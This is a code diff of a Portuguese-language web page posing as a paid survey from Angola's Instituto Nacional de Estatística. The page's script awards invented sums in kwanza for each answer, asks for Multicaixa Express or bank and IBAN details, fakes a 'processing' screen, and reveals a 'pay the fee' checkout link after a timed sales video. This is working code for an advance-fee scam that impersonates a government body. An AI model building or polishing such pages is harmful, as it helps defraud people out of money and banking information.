+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 90%;"></div>
+                        <div class="v-bar" style="height: 40%;"></div>
+                        <div class="v-bar" style="height: 15%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label" style="font-size: 0.6rem;">SIM</div>
+                        <div class="v-label" style="font-size: 0.6rem;">TALVEZ</div>
+                        <div class="v-label" style="font-size: 0.6rem;">NÃO</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 11: Importance Question -->
+            <div id="step-11" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Qual destas áreas você considera mais
+                    importante no seu dia a dia?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 12)">Bancos e pagamentos</button>
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 12)">Internet e telefonia</button>
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 12)">Supermercados e
+                        alimentação</button>
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 12)">Televisão e
+                        entretenimento</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 11 -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 60%;"></div>
+                        <div class="v-bar" style="height: 45%;"></div>
+                        <div class="v-bar" style="height: 85%;"></div>
+                        <div class="v-bar" style="height: 30%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label" style="font-size: 0.5rem;">BANCO</div>
+                        <div class="v-label" style="font-size: 0.5rem;">INTERNET</div>
+                        <div class="v-label" style="font-size: 0.5rem;">MERCADO</div>
+                        <div class="v-label" style="font-size: 0.5rem;">TV</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 12: Withdrawal Method Selection -->
+            <div id="step-12" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 2rem; font-size: 1.3rem;">ESCOLHA POR ONDE QUER
+                    RECEBER O SEU SAQUE:</h2>
+
+                <!-- Balance Display Card -->
+                <div class="withdraw-balance-card">
+                    <span class="balance-label">Valor disponível para saque:</span>
+                    <div class="balance-value" id="withdrawBalanceDisplay">0 KZ</div>
+                </div>
+
+                <div class="withdraw-methods">
+                    <button class="method-btn" id="btn-express" onclick="setWithdrawMethod('express')">
+                        <span class="method-check"></span>
+                        Multicaixa Express
+                    </button>
+                    <button class="method-btn" id="btn-bank" onclick="setWithdrawMethod('bank')">
+                        <span class="method-check"></span>
+                        Transferência Bancária
                     </button>
                 </div>
-            </footer>
+
+                <!-- Express Form -->
+                <div id="form-express" class="withdraw-form" style="display: none;">
+                    <input type="text" placeholder="Seu número do Express" class="withdraw-input" id="express-phone" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+
+                <!-- Bank Form -->
+                <div id="form-bank" class="withdraw-form" style="display: none;">
+                    <input type="text" placeholder="Nome do titular da conta" class="withdraw-input" id="bank-holder">
+                    <input type="text" placeholder="Nome do banco" class="withdraw-input" id="bank-name">
+                    <input type="text" placeholder="Número do IBAN" class="withdraw-input" id="bank-iban" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+
+                <div id="withdraw-action" style="display: none; margin-top: 2rem;">
+                    <button class="cta-button" style="width: 100%;" onclick="submitWithdraw()">CONCLUIR SAQUE</button>
+                </div>
+            </div>
+
+            <!-- STEP 13: Loading Screen -->
+            <div id="step-13" style="display: none; text-align: center; padding: 3rem 1rem;">
+                <div class="loading-spinner"></div>
+                <h2 style="color: var(--secondary-color); margin-top: 2rem;">Processando o seu saque...</h2>
+                <p style="color: #666; margin-top: 0.5rem;">Por favor, aguarde alguns segundos.</p>
+            </div>
+
+            <!-- STEP 14: VSL Page -->
+            <div id="step-14" style="display: none; text-align: center; padding: 2rem 1rem; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 2rem; font-weight: 800; font-size: 1.3rem; line-height: 1.4; text-transform: uppercase;">
+                    ASSISTA O VÍDEO ABAIXO PARA VER COMO RECEBER O SEU DINHEIRO AGORA MESMO
+                </h2>
+
+                <div class="video-container" style="margin-bottom: 2rem; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.15);">
+                    <vturb-smartplayer id="vid-6984d6643354a5f5fc8d987d" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+                </div>
+
+                <div id="delay-button" style="display: none; margin-top: 1rem;">
+                    <a href="https://culonga.com/checkout/d916a1e4-b68d-4eca-808b-9c1fb7aa5bf8" class="cta-button" style="width: 100%; text-decoration: none;">PAGAR A TAXA</a>
+                </div>
+            </div>
         </div>
-    </div>
-    <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
-        <ol tabindex="-1"
-            class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]">
 
-        </ol>
-    </div>
-    </div>
+        <!-- Reward Modal -->
+        <div class="reward-overlay" id="rewardOverlay"></div>
+        <div class="reward-modal" id="rewardModal">
+            <img src="images/money_flying_icon.png" alt="Parabéns" class="reward-icon">
+            <h2 style="color: #4CAF50; margin-bottom: 0.5rem;">Parabéns!</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 1.5rem; color: #333;">Você ganhou <strong id="rewardAmountDisplay">0 KZ</strong>!
+            </p>
+            <button class="cta-button" onclick="closeReward()">CONTINUAR</button>
+        </div>
+
+        <!-- Completion Modal -->
+        <div class="reward-modal" id="completionModal">
+            <img src="images/money_flying_icon.png" alt="Sucesso" class="reward-icon">
+            <h2 style="color: #4CAF50; margin-bottom: 0.5rem;">Pronto!</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 1.5rem; color: #333;">Já pode levantar o seu dinheiro agora</p>
+            <button class="cta-button" onclick="finalWithdraw()">Sacar</button>
+        </div>
+
+        <script>
+            let currentBalance = 0;
+            let nextStepId = 0;
+
+            function showStep2() {
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+                window.scrollTo(0, 0);
+            }
+
+            function showStep3() {
+                const nameInput = document.querySelector('.name-input');
+                const fullName = nameInput.value.trim();
+
+                if (!fullName) {
+                    alert('Por favor, digite seu nome para continuar.');
+                    return;
+                }
+
+                // Get only the first name
+                let firstName = fullName.split(' ')[0];
+
+                // Limit to 7 characters
+                if (firstName.length > 7) {
+                    firstName = firstName.substring(0, 7) + '...';
+                }
+
+                document.getElementById('headerName').textContent = firstName;
+                document.getElementById('userHeader').style.display = 'flex';
+
+                document.getElementById('step-2').style.display = 'none';
+                document.getElementById('step-3').style.display = 'block';
+                window.scrollTo(0, 0);
+            }
+
+            function showStep4() {
+                document.getElementById('step-3').style.display = 'none';
+                document.getElementById('step-4').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep5() {
+                document.getElementById('step-4').style.display = 'none';
+                document.getElementById('step-5').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep6() {
+                document.getElementById('step-5').style.display = 'none';
+                document.getElementById('step-6').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep7() {
+                document.getElementById('step-6').style.display = 'none';
+                document.getElementById('step-7').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep8() {
+                document.getElementById('step-7').style.display = 'none';
+                document.getElementById('step-8').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep9() {
+                document.getElementById('step-8').style.display = 'none';
+                document.getElementById('step-9').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep10() {
+                document.getElementById('step-9').style.display = 'none';
+                document.getElementById('step-10').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function showStep11() {
+                document.getElementById('step-10').style.display = 'none';
+                document.getElementById('step-11').style.display = 'block';
+                createBalloons();
+                window.scrollTo(0, 0);
+            }
+
+            function createBalloons() {
+                const colors = ['#f36c21', '#2e3192', '#4CAF50', '#FFC107', '#E91E63'];
+                for (let i = 0; i < 30; i++) {
+                    const balloon = document.createElement('div');
+                    balloon.classList.add('balloon');
+                    const x = Math.random() * 100;
+                    const delay = Math.random() * 2;
+                    const duration = 3 + Math.random() * 2;
+                    const color = colors[Math.floor(Math.random() * colors.length)];
+
+                    balloon.style.left = `${x}%`;
+                    balloon.style.animationDelay = `${delay}s`;
+                    balloon.style.animationDuration = `${duration}s`;
+                    balloon.style.backgroundColor = color;
+                    balloon.style.setProperty('--balloon-color', color);
+
+                    document.body.appendChild(balloon);
+
+                    // Remove after animation
+                    setTimeout(() => {
+                        balloon.remove();
+                    }, (duration + delay) * 1000);
+                }
+            }
+
+            function selectOption(btn, amount, nextStep) {
+                // Update balance
+                currentBalance += amount;
+                document.getElementById('headerBalance').textContent = currentBalance.toLocaleString('pt-AO') + ' KZ';
+
+                // Set next step
+                nextStepId = nextStep;
+
+                document.getElementById('rewardOverlay').classList.add('active');
+                document.getElementById('rewardModal').classList.add('active');
+
+                // Animate reward amount
+                animateValue("rewardAmountDisplay", 0, amount, 1000);
+            }
+
+            function animateValue(id, start, end, duration) {
+                const obj = document.getElementById(id);
+                let startTimestamp = null;
+                const step = (timestamp) => {
+                    if (!startTimestamp) startTimestamp = timestamp;
+                    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                    const value = Math.floor(progress * (end - start) + start);
+                    obj.textContent = value.toLocaleString('pt-AO') + ' KZ';
+                    if (progress < 1) {
+                        window.requestAnimationFrame(step);
+                    }
+                };
+                window.requestAnimationFrame(step);
+            }
+
+            function closeReward() {
+                document.getElementById('rewardOverlay').classList.remove('active');
+                document.getElementById('rewardModal').classList.remove('active');
+
+                if (nextStepId === 5) {
+                    showStep5();
+                } else if (nextStepId === 6) {
+                    showStep6();
+                } else if (nextStepId === 7) {
+                    showStep7();
+                } else if (nextStepId === 8) {
+                    showStep8();
+                } else if (nextStepId === 9) {
+                    showStep9();
+                } else if (nextStepId === 10) {
+                    showStep10();
+                } else if (nextStepId === 11) {
+                    showStep11();
+                } else if (nextStepId === 12) {
+                    document.getElementById('rewardOverlay').classList.add('active');
+                    document.getElementById('completionModal').classList.add('active');
+                }
+            }
+
+            function finalWithdraw() {
+                // Hide modal and overlay
+                document.getElementById('rewardOverlay').classList.remove('active');
+                document.getElementById('completionModal').classList.remove('active');
+
+                // Transition to Step 12
+                document.getElementById('step-11').style.display = 'none';
+                document.getElementById('step-12').style.display = 'block';
+
+                // Update balance on Step 12
+                document.getElementById('withdrawBalanceDisplay').textContent = currentBalance.toLocaleString('pt-AO') + ' KZ';
+
+                window.scrollTo(0, 0);
+            }
+
+            function setWithdrawMethod(method) {
+                // Toggle active buttons
+                document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
+                document.getElementById(`btn-${method}`).classList.add('active');
+
+                // Toggle forms
+                document.querySelectorAll('.withdraw-form').forEach(form => form.style.display = 'none');
+                document.getElementById(`form-${method}`).style.display = 'block';
+
+                // Show action button
+                document.getElementById('withdraw-action').style.display = 'block';
+            }
+
+            function submitWithdraw() {
+                const activeMethod = document.querySelector('.method-btn.active').id;
+                let isValid = true;
+
+                if (activeMethod === 'btn-express') {
+                    if (!document.getElementById('express-phone').value.trim()) isValid = false;
+                } else {
+                    if (!document.getElementById('bank-holder').value.trim() ||
+                        !document.getElementById('bank-name').value.trim() ||
+                        !document.getElementById('bank-iban').value.trim()) isValid = false;
+                }
+
+                if (!isValid) {
+                    alert('Por favor, preencha todos os campos para continuar.');
+                    return;
+                }
+
+                // Show loading screen
+                document.getElementById('step-12').style.display = 'none';
+                document.getElementById('step-13').style.display = 'block';
+                window.scrollTo(0, 0);
+
+                // Wait 4 seconds then show success (VSL)
+                setTimeout(() => {
+                    document.getElementById('step-13').style.display = 'none';
+                    document.getElementById('step-14').style.display = 'block';
+                    window.scrollTo(0, 0);
+
+                    // Inject Vturb script only now
+                    loadVturbScript();
+
+                    // Start delay for the checkout button
+                    startButtonDelay();
+                }, 4000);
+            }
+
+            function loadVturbScript() {
+                var s = document.createElement("script");
+                s.src = "https://scripts.converteai.net/f5ec919a-6744-479e-9bf0-4c390fcbd827/players/6984d6643354a5f5fc8d987d/v4/player.js";
+                s.async = !0;
+                document.head.appendChild(s);
+            }
+
+            function startButtonDelay() {
+                // 3 minutes and 8 seconds = 188 seconds
+                const delayInSeconds = 188;
+
+                setTimeout(() => {
+                    const btn = document.getElementById('delay-button');
+                    if (btn) {
+                        btn.style.display = 'block';
+                        btn.style.animation = 'fadeIn 0.5s ease-out';
+                    }
+                }, delayInSeconds * 1000);
+            }
+        </script>
+    </main>
+
+    <footer>
+        <p>© 2026 Instituto Nacional de Estatística - Angola</p>
+    </footer>
 
 
-    <script>
-        const botao = document.getElementById("btnContinuar");
 
-
-        // garante que começa escondido
-        botao.style.display = "none";
-
-        // 5 minutos (em milissegundos)
-        const TEMPO_ESPERA = 5 * 30 * 1000;
-
-
-        setTimeout(() => {
-            botao.style.display = "inline-flex";
-
-            // toca som de dinheiro quando aparecer
-            som.play().catch(() => {
-                console.log("Som bloqueado pelo navegador");
-            });
-
-        }, TEMPO_ESPERA);
-
-        function continuar() {
-
-            window.location.href = "cadastro.html"
-        }
-    </script>
 
 </body>
-
-
-</html>
-
-
-
